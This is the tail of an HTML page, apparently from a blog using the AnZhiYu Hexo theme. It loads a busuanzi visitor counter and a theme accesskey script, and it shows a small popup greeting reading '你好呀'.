+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
